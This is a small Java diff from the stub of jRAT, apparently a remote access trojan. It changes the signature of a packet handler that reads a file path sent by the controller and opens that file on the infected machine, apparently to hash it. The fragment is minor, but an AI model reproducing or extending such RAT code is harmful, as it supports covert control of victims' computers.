@@ -11,7 +11,7 @@ import se.jrat.stub.packets.outgoing.Packet46FileHash;
 public class Packet64FileHash extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String path = Connection.instance.readLine();
 
 		File file = new File(path);
